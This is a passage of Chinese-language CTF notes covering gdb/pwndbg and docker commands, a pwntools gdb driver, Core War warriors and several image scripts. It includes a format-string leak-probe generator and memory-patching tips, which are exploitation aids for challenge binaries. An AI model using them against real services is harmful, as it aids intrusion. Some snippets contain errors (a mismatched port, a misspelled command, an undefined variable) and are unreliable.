<li>同理还可以修改汇编指令，找到指令所在的地址处即可。<code>set *(unsigned char*)addr=byte</code>（ <a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/6473908/can-gdb-change-the-assembly-code-of-a-running-program">https://stackoverflow.com/questions/6473908/can-gdb-change-the-assembly-code-of-a-running-program</a> ）.不过这样改是暂时的，重新run的话就要再patch一次</li>
<li>以及32位下修改addr处的内存（4个字节）：<code>set *(unsigned int*)addr=value</code>。但今天测试后发现直接<code>set *addr=value</code>就行。不过这种方式只能设置32bit</li>
<li>set命令可以直接设置寄存器的内容为某个字符串。如<code>set $rdi=&quot;/bin/sh&quot;</code>。但似乎不能直接将某个地址的内容设为字符串</li>
</ul>
</li>
<li><p><code>gdb -batch -ex &#39;file &lt;program&gt;&#39; -ex &#39;disassemble &lt;func_name&gt;&#39;</code></p>
<ul>
<li>反汇编某个程序的某个函数，参考 <a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/22769246/how-to-disassemble-one-single-function-using-objdump">https://stackoverflow.com/questions/22769246/how-to-disassemble-one-single-function-using-objdump</a></li>
</ul>
</li>
<li><p><code>jump &lt;addr&gt;</code></p>
<ul>
<li>跳转到某个地址</li>
</ul>
</li>
<li><p><code>p &amp;name_of_symbol</code></p>
<ul>
<li>获取指定symbol的偏移&#x2F;地址（运行时）</li>
</ul>
</li>
<li><p><code>finish</code></p>
<ul>
<li>Execute until selected stack frame returns</li>
</ul>
</li>
<li><p>可以用gdbserver跨docker container调试。首先在container内运行：</p>
</li>
</ul>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh">docker run -it -p 2345:2435  ... bash<br>apt update &amp;&amp; apt install -y gdbserver<br>gdsbserver 0:2345 ./chal <br></code></pre></td></tr></table></figure>

<p>然后本机运行：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">target remote 0:2345<br></code></pre></td></tr></table></figure>

<ul>
<li><code>define hook-stop</code><ul>
<li>设置程序每次抵达断点处时执行的命令</li>
</ul>
</li>
<li><code>command</code><ul>
<li>用于定义新命令或是给已存在的命令起alias。也可以用来设置程序每次抵达某个断点处时执行的命令</li>
</ul>
</li>
<li><code>set pagination off</code><ul>
<li>当需要展示较多信息时，gdb会分页。该命令用于禁用分页，一次输出全部信息</li>
</ul>
</li>
<li>如何调试fork的子进程： <a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/15126925/debugging-child-process-after-fork-follow-fork-mode-child-configured">https://stackoverflow.com/questions/15126925/debugging-child-process-after-fork-follow-fork-mode-child-configured</a></li>
<li>一些pwndbg独有的<a target="_blank" rel="noopener" href="https://browserpwndbg.readthedocs.io/en/docs/">命令</a><ul>
<li><code>distance a b</code><ul>
<li>获取从a到b地址的差值</li>
</ul>
</li>
<li><code>vis_heap_chunks</code><ul>
<li>查看堆块（不同堆块会用不同颜色区分）</li>
</ul>
</li>
<li><code>brva offset</code><ul>
<li>在当前程序的基地址+offset处下断点。要求程序已运行（比如先starti再brva）</li>
</ul>
</li>
<li><code>leakfind</code><ul>
<li>在指定的地址范围内寻找可供泄露的地址链。使用案例：<code>leakfind 0x7ffff7db7000 --max_offset=0x200000 --page_name stack --max_depth=1</code>,尝试在0x7ffff7db7000偏移最大0x200000的区域内找指向stack地址的地址链，链长度最长为1</li>
</ul>
</li>
<li><code>got -p libc</code><ul>
<li>打印libc里的可写got表</li>
</ul>
</li>
<li>配合qemu调试16-bit&#x2F;real mode： <a target="_blank" rel="noopener" href="https://gist.github.com/Theldus/4e1efc07ec13fb84fa10c2f3d054dccd">https://gist.github.com/Theldus/4e1efc07ec13fb84fa10c2f3d054dccd</a> ， <a target="_blank" rel="noopener" href="https://ternet.fr/gdb_real_mode.html">https://ternet.fr/gdb_real_mode.html</a></li>
</ul>
</li>
</ul>
<h2 id="docker命令"><a href="#docker命令" class="headerlink" title="docker命令"></a>docker命令</h2><ul>
<li><p>docker run –platform linux&#x2F;amd64 -it ubuntu &#x2F;bin&#x2F;bash</p>
<blockquote>
<p>开启amd64位的ubuntu container，如果本地没有相应镜像就会自动拉取并开启。注意已有container后无需使用该命令再次创建一个container。</p>
</blockquote>
</li>
<li><p>docker container start [container name]</p>
<blockquote>
<p>运行一个已创建的container</p>
</blockquote>
</li>
<li><p>docker container ls</p>
<blockquote>
<p>查看已有的container</p>
</blockquote>
</li>
<li><p>docker container attach [CONTAINER ID]</p>
<blockquote>
<p>附加到一个已运行的container（可获取高亮，自动补全，需要先用<code>docker container start</code>启动container）</p>
</blockquote>
</li>
<li><p>docker rename [old name] [new name]</p>
<blockquote>
<p>重命名container</p>
</blockquote>
</li>
<li><p>docker run -i -v “`pwd`:&#x2F;chal” -t xxx@sha256:xxx</p>
<blockquote>
<p>以container形式运行镜像。一般在题目的docker file中能看到<code>xxx@sha256:xxx</code>字样，这就是镜像（image）。-v指定双向挂载，任何在container内部的chal文件夹的文件也会出现在当前目录中（`pwd`命令）。</p>
</blockquote>
</li>
<li><p>从Dockerfile build： <a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/36075525/how-do-i-run-a-docker-instance-from-a-dockerfile">https://stackoverflow.com/questions/36075525/how-do-i-run-a-docker-instance-from-a-dockerfile</a></p>
<ul>
<li>注意Dockerfile命名不要改成其他的，而且要放在当前目录下</li>
<li><code>docker build --tag &#39;name&#39; .</code></li>
<li><code>docker image ls</code>：查看build的image</li>
</ul>
</li>
<li><p>interactive运行docker image： <a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/40854482/interactive-command-in-dockerfile">https://stackoverflow.com/questions/40854482/interactive-command-in-dockerfile</a></p>
<ul>
<li><code>docker run -it &lt;image id&gt; /bin/bash</code></li>
<li>如果是web题需要开放端口： <code>docker run -it --expose &lt;container port&gt; -p &lt;host port&gt;:&lt;container port&gt; &lt;image id&gt;</code>,参考 <a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/30109037/how-can-i-forward-localhost-port-on-my-container-to-localhost-on-my-host">https://stackoverflow.com/questions/30109037/how-can-i-forward-localhost-port-on-my-container-to-localhost-on-my-host</a></li>
</ul>
</li>
<li><p>从Container里拷贝文件到本机： <a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/22049212/copying-files-from-docker-container-to-host">https://stackoverflow.com/questions/22049212/copying-files-from-docker-container-to-host</a></p>
<ul>
<li>查看container id&#x2F;name（不要和上面的image id搞混了）：<code>docker container ls</code></li>
<li>libc等文件的路径： <a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/5925678/location-of-c-standard-library">https://stackoverflow.com/questions/5925678/location-of-c-standard-library</a> 。或者直接用<code>ldd binary</code>获取路径</li>
<li>今天又看见个脚本： <a target="_blank" rel="noopener" href="https://github.com/rerrorctf/ret/blob/main/commands/libc.go">https://github.com/rerrorctf/ret/blob/main/commands/libc.go</a> ，可以直接将container里的libc提取出来</li>
</ul>
</li>
<li><p><code>docker run -it &lt;image id&gt; /bin/bash -v pwd1:pwd2</code></p>
<ul>
<li>与docker container共享目录。本机上的pwd1目录等同于container内部的pwd2目录</li>
</ul>
</li>
</ul>
<h2 id="Qemu-arm-amd64-x86-arm"><a href="#Qemu-arm-amd64-x86-arm" class="headerlink" title="Qemu arm-&gt;amd64&#x2F;x86-&gt;arm"></a>Qemu arm-&gt;amd64&#x2F;x86-&gt;arm</h2><ul>
<li>arm-&gt;amd64<ul>
<li><a target="_blank" rel="noopener" href="https://rw1nd.github.io/2021/04/13/x86-on-arm/">https://rw1nd.github.io/2021/04/13/x86-on-arm/</a></li>
<li><a target="_blank" rel="noopener" href="https://levelup.gitconnected.com/running-amd64-linux-on-apple-m1-with-qemu-utm-64d67cccd6f8">https://levelup.gitconnected.com/running-amd64-linux-on-apple-m1-with-qemu-utm-64d67cccd6f8</a></li>
</ul>
</li>
<li>x86-&gt;arm<ul>
<li><a target="_blank" rel="noopener" href="https://azeria-labs.com/arm-on-x86-qemu-user/">https://azeria-labs.com/arm-on-x86-qemu-user/</a></li>
</ul>
</li>
</ul>
<h2 id="gdb调试脚本"><a href="#gdb调试脚本" class="headerlink" title="gdb调试脚本"></a>gdb调试脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.terminal = [<span class="hljs-string">&quot;tmux&quot;</span>, <span class="hljs-string">&quot;splitw&quot;</span>, <span class="hljs-string">&quot;-h&quot;</span>] <span class="hljs-comment">#分屏后ctrl+b o组合键切屏</span><br>p=process(<span class="hljs-string">&quot;gdb&quot;</span>)<br>sla=<span class="hljs-keyword">lambda</span> d,payload:p.sendlineafter(d,payload)<br>ia=<span class="hljs-keyword">lambda</span>:p.interactive()<br>ra=<span class="hljs-keyword">lambda</span> timeout=<span class="hljs-number">0.5</span>:p.recvall(timeout=timeout)<br>rl=<span class="hljs-keyword">lambda</span> keep=<span class="hljs-literal">False</span>:p.recvline(keepends=keep)<br>sl=<span class="hljs-keyword">lambda</span> payload:p.sendline(payload)<br>rls=<span class="hljs-keyword">lambda</span> line:p.recvlines(line)<br>ru=<span class="hljs-keyword">lambda</span> payload,drop=<span class="hljs-literal">True</span>:p.recvuntil(payload,drop)<br>cl=<span class="hljs-keyword">lambda</span>:p.close()<br>s=<span class="hljs-keyword">lambda</span> payload:p.send(payload)<br>base=<span class="hljs-number">0x555555554000</span> <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">PIEDebug</span>(<span class="hljs-params">file,breakpoints,params=[]</span>):<br>    sla(<span class="hljs-string">&quot;pwndbg&gt;&quot;</span>,<span class="hljs-string">f&quot;file <span class="hljs-subst">&#123;file&#125;</span>&quot;</span>)<br>    sla(<span class="hljs-string">&quot;pwndbg&gt;&quot;</span>,<span class="hljs-string">f&quot;starti <span class="hljs-subst">&#123;<span class="hljs-string">&#x27; &#x27;</span>.join(params)&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> breakpoints:<br>        sla(<span class="hljs-string">&quot;pwndbg&gt;&quot;</span>,<span class="hljs-string">f&quot;b *<span class="hljs-subst">&#123;base+i&#125;</span>&quot;</span>)<br>    sla(<span class="hljs-string">&quot;pwndbg&gt;&quot;</span>,<span class="hljs-string">&quot;c&quot;</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">test_format_string</span>(<span class="hljs-params">times,start=<span class="hljs-number">0</span>,end=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    payload=<span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(start,start+times):<br>        payload+=<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;i&#125;</span>:%<span class="hljs-subst">&#123;i&#125;</span>$p&#x27;</span>+end<br>    <span class="hljs-keyword">return</span> payload[:-<span class="hljs-number">1</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_register</span>(<span class="hljs-params">reg</span>):<br>    sla(<span class="hljs-string">&quot;pwndbg&gt;&quot;</span>,<span class="hljs-string">&quot;i r&quot;</span>)<br>    contents=ru(<span class="hljs-string">&quot;gs&quot;</span>).split(<span class="hljs-string">b&#x27;\n&#x27;</span>)[:-<span class="hljs-number">1</span>]<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> contents:<br>        <span class="hljs-built_in">print</span>(i)<br>        temp=i.split()<br>        register=temp[<span class="hljs-number">0</span>]<br>        value=temp[<span class="hljs-number">1</span>]<br>        <span class="hljs-keyword">if</span> reg.encode() <span class="hljs-keyword">in</span> register:<br>            <span class="hljs-keyword">return</span> value<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;none&quot;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">set_register</span>(<span class="hljs-params">register,value</span>):<br>    sla(<span class="hljs-string">&quot;pwndbg&gt;&quot;</span>,<span class="hljs-string">f&quot;set $<span class="hljs-subst">&#123;register&#125;</span> = <span class="hljs-subst">&#123;value&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure>

<h2 id="基础波形图绘制脚本"><a href="#基础波形图绘制脚本" class="headerlink" title="基础波形图绘制脚本"></a>基础波形图绘制脚本</h2><p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/371394137">参考</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><span class="hljs-keyword">import</span> matplotlib.pyplot <span class="hljs-keyword">as</span> plt<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;res.txt&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    d=f.read().split(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>traces=<span class="hljs-built_in">eval</span>(d[<span class="hljs-number">1</span>].split(<span class="hljs-string">&#x27;:&#x27;</span>)[<span class="hljs-number">1</span>])<br>t=np.arange(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(traces))<br>plt.plot(t, traces)<br>plt.show()<br></code></pre></td></tr></table></figure>

<h2 id="linux命令替代"><a href="#linux命令替代" class="headerlink" title="linux命令替代"></a>linux命令替代</h2><ul>
<li><a target="_blank" rel="noopener" href="https://ubunlog.com/en/alternativas-al-comando-ls/">ls</a></li>
<li><a target="_blank" rel="noopener" href="https://unix.stackexchange.com/questions/86321/how-can-i-display-the-contents-of-a-text-file-on-the-command-line">cat</a></li>
<li><a target="_blank" rel="noopener" href="https://blog.maple3142.net/2023/03/29/picoctf-2023-writeups/#specialer">Specialer</a>:<code>for f in **/*; do echo $(&lt;$f); done</code></li>
</ul>
<h2 id="Core-war"><a href="#Core-war" class="headerlink" title="Core war"></a>Core war</h2><ul>
<li><a target="_blank" rel="noopener" href="https://corewar.co.uk/index.htm">Core War</a></li>
<li><a target="_blank" rel="noopener" href="http://www.koth.org/info.html">koth</a></li>
</ul>
<p>以下warrior都是standard redcode。</p>
<p>一个稳输的自毁warrior：</p>
<figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-comment">;redcode</span><br><span class="hljs-comment">;assert 1</span><br><span class="hljs-keyword">ADD</span> <span class="hljs-meta">#-1, 3</span><br><span class="hljs-keyword">MOV</span> <span class="hljs-number">2</span>, <span class="hljs-subst">@2</span><br><span class="hljs-keyword">JMP</span> <span class="hljs-number">-2</span><br>DAT <span class="hljs-meta">#0, #0</span><br></code></pre></td></tr></table></figure>

<p>一个稍微能赢一点的基础warrior(dwarf)：</p>
<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-comment">;redcode</span><br><span class="hljs-comment">;assert 1</span><br>start   <span class="hljs-keyword">add.ab </span> <span class="hljs-comment">#4, bmb</span><br>        mov.i   <span class="hljs-keyword">bmb, </span>@<span class="hljs-keyword">bmb</span><br><span class="hljs-keyword"></span>        <span class="hljs-keyword">jmp </span>    start<br><span class="hljs-keyword">bmb </span>    dat     <span class="hljs-comment">#0, #0</span><br></code></pre></td></tr></table></figure>

<p>一个胜率较高的warrior：</p>
<figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-comment">;redcode</span><br><span class="hljs-comment">;assert 1</span><br>        org    start<br><br>gate    dat    <span class="hljs-number">4000</span>,       <span class="hljs-number">1700</span><br>bomb    dat    &gt;<span class="hljs-number">2667</span>,      <span class="hljs-number">11</span><br><br>        for    <span class="hljs-number">4</span><br>        dat    <span class="hljs-number">0</span>,<span class="hljs-number">0</span><br>        rof<br><br>        <span class="hljs-built_in">spl</span>    <span class="hljs-meta">#4000,      &gt;gate</span><br>clear   <span class="hljs-keyword">mov</span>    bomb,       &gt;gate<br>        djn.f  clear,      &gt;gate<br><br>        for    <span class="hljs-number">23</span><br>        dat    <span class="hljs-number">0</span>,<span class="hljs-number">0</span><br>        rof<br><br>        istep  equ <span class="hljs-number">1143</span>           <span class="hljs-comment">; (CORESIZE+1)/7</span><br><br>start   <span class="hljs-built_in">spl</span>    clear<span class="hljs-number">-1</span><br>        <span class="hljs-keyword">mov</span>    imp,        *launch<br>        <span class="hljs-built_in">spl</span>    <span class="hljs-number">1</span>                  <span class="hljs-comment">; 32 parallel processes</span><br>        <span class="hljs-built_in">spl</span>    <span class="hljs-number">1</span><br>        <span class="hljs-built_in">spl</span>    <span class="hljs-number">1</span><br>        <span class="hljs-built_in">spl</span>    <span class="hljs-number">1</span><br>        <span class="hljs-built_in">spl</span>    <span class="hljs-number">1</span><br>        <span class="hljs-built_in">spl</span>    nxpoint<br>launch  djn.f  <span class="hljs-number">3600</span>,       &lt;<span class="hljs-number">4000</span><br><br>        for    <span class="hljs-number">2</span><br>        dat    <span class="hljs-number">0</span>,<span class="hljs-number">0</span><br>        rof<br><br>nxpoint <span class="hljs-keyword">add</span>.f  <span class="hljs-meta">#istep,     launch</span><br>        djn.f  clear<span class="hljs-number">-1</span>,    &lt;<span class="hljs-number">3000</span><br><br>imp     <span class="hljs-keyword">mov</span>.i  <span class="hljs-meta">#1,         istep</span><br></code></pre></td></tr></table></figure>

<h2 id="打印嵌套文件夹内的所有文件内容"><a href="#打印嵌套文件夹内的所有文件内容" class="headerlink" title="打印嵌套文件夹内的所有文件内容"></a>打印嵌套文件夹内的所有文件内容</h2><p><code>find /path/to/folder -type f -exec cat &#123;&#125; \;</code></p>
<h2 id="python画二维码"><a href="#python画二维码" class="headerlink" title="python画二维码"></a>python画二维码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br>MAX = <span class="hljs-number">100</span><br>pic = Image.new(<span class="hljs-string">&quot;RGB&quot;</span>,(MAX, MAX))<br>file = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;qr.txt&quot;</span>,<span class="hljs-string">&#x27;r&#x27;</span>)<br>m = file.read().split(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>i=<span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span> (<span class="hljs-number">0</span>,MAX):<br>	<span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span> (<span class="hljs-number">0</span>,MAX):<br>		<span class="hljs-keyword">if</span>(m[i] == <span class="hljs-string">&#x27;0&#x27;</span>):<br>			pic.putpixel([x,y],(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>))<br>		<span class="hljs-keyword">else</span>:<br>			pic.putpixel([x,y],(<span class="hljs-number">255</span>,<span class="hljs-number">255</span>,<span class="hljs-number">255</span>))<br>		i = i+<span class="hljs-number">1</span><br>pic.save(<span class="hljs-string">&quot;res.png&quot;</span>)<br></code></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><span class="hljs-keyword">from</span> matplotlib <span class="hljs-keyword">import</span> pyplot <span class="hljs-keyword">as</span> plt<br><br>data = np.zeros((<span class="hljs-number">100</span>, <span class="hljs-number">100</span>))<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;qr.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    idx = <span class="hljs-number">0</span><br><br>    <span class="hljs-keyword">for</span> bit <span class="hljs-keyword">in</span> f:<br>        bit = <span class="hljs-built_in">int</span>(bit)<br>        data[idx // <span class="hljs-number">100</span>][idx % <span class="hljs-number">100</span>] = bit<br><br>        idx = idx + <span class="hljs-number">1</span><br><br>plt.imshow(data, interpolation = <span class="hljs-string">&quot;nearest&quot;</span>)<br>plt.show()<br></code></pre></td></tr></table></figure>

<h2 id="python-cv2描绘运动轨迹"><a href="#python-cv2描绘运动轨迹" class="headerlink" title="python cv2描绘运动轨迹"></a>python cv2描绘运动轨迹</h2><p>利用前后帧生成光流，如果该光流往左下走则描绘出来</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> cv2,numpy <span class="hljs-keyword">as</span> np,matplotlib.pyplot <span class="hljs-keyword">as</span> plt<br>cap = cv2.VideoCapture(<span class="hljs-string">&#x27;out_flag.mp4&#x27;</span>)<br>ret, frame = cap.read()<br>gray = cv2.cvtColor(frame, cv2.COLOR_BGR2GRAY)<br>mask = np.zeros_like(gray).astype(np.float64)<br>fr = <span class="hljs-number">0</span><br>plt.figure(figsize=(<span class="hljs-number">12</span>,<span class="hljs-number">8</span>))<br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    fr +=<span class="hljs-number">1</span><br>    ret, frame = cap.read()<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> ret:<br>        <span class="hljs-keyword">break</span><br>    gray_next = cv2.cvtColor(frame, cv2.COLOR_BGR2GRAY)<br>    flow = cv2.calcOpticalFlowFarneback(gray, gray_next, <span class="hljs-literal">None</span>, <span class="hljs-number">0.5</span>, <span class="hljs-number">3</span>, <span class="hljs-number">15</span>, <span class="hljs-number">3</span>, <span class="hljs-number">5</span>, <span class="hljs-number">1.2</span>, <span class="hljs-number">0</span>)<br>    h, w = gray.shape<br>    y, x = np.mgrid[<span class="hljs-number">0</span>:h:<span class="hljs-number">10</span>, <span class="hljs-number">0</span>:w:<span class="hljs-number">10</span>].reshape(<span class="hljs-number">2</span>, -<span class="hljs-number">1</span>).astype(<span class="hljs-built_in">int</span>)<br>    fx, fy = flow[y, x].T<br>    lines = np.vstack([x, y, x + fx, y + fy]).T.reshape(-<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>)<br>    lines = np.int32(lines + <span class="hljs-number">0.5</span>)<br>    vis = np.zeros_like(gray)<br>    <span class="hljs-keyword">for</span> (x1, y1), (x2, y2) <span class="hljs-keyword">in</span> lines:<br>        <span class="hljs-keyword">if</span> x1 &gt; x2  <span class="hljs-keyword">and</span> y1&lt;y2:<br>            cv2.line(vis, (x1, y1), (x2, y2), <span class="hljs-number">255</span> , <span class="hljs-number">2</span>)<br>    mask += vis&amp;gray<br>    <span class="hljs-keyword">if</span> fr % <span class="hljs-number">10</span> ==<span class="hljs-number">0</span>:<br>        show=mask.copy()<br>        cv2.putText(show,<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;fr&#125;</span>&#x27;</span>,(<span class="hljs-number">5</span>,<span class="hljs-number">50</span>), cv2.FONT_HERSHEY_SIMPLEX, <span class="hljs-number">0.75</span>, <span class="hljs-number">255</span>, <span class="hljs-number">2</span>)<br>        cv2.imshow(<span class="hljs-string">&#x27;frame2&#x27;</span>, show)<br>        <span class="hljs-keyword">if</span> cv2.waitKey(<span class="hljs-number">25</span>) &amp; <span class="hljs-number">0xFF</span> == <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;q&#x27;</span>):<br>            <span class="hljs-keyword">break</span><br>    gray=gray_next<br>plt.imshow(np.log(mask))<br>plt.imshow(np.log(mask+<span class="hljs-number">1</span>))<br>plt.show()<br>cap.release()<br>cv2.destroyAllWindows()<br></code></pre></td></tr></table></figure>

<h2 id="Visual-cryptography-python脚本"><a href="#Visual-cryptography-python脚本" class="headerlink" title="Visual cryptography python脚本"></a><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Visual_cryptography">Visual cryptography</a> python脚本</h2><p>大概就是把两张黑白图片叠在一起，就能看见要传递的内容。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br>im1 = Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;1.png&quot;</span>)<br>im2 = Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;2.png&quot;</span>)<br>iminp = np.array(im1)<br>im2np = np.array(im2)<br>result = im2np + im1inp<br>Image.fromarray(result).save(<span class="hljs-string">&#x27;result.png&#x27;</span>)<br></code></pre></td></tr></table></figure>

<p>或者把信息用白色显现出来：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><span class="hljs-comment"># Load the first share</span><br>sharel = Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;img1.png&quot;</span>) .convert(<span class="hljs-string">&#x27;1&#x27;</span>)<br><span class="hljs-comment"># Load the second share</span><br>share2 = Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;img2.png&quot;</span>) .convert(<span class="hljs-string">&#x27;1&#x27;</span>)<br><span class="hljs-comment"># Get the size of the shares</span><br>width, height = sharel.size<br><span class="hljs-comment"># Create a new image for the result</span><br>result = Image.new(<span class="hljs-string">&quot;1&quot;</span>, (width, height))<br><span class="hljs-comment"># 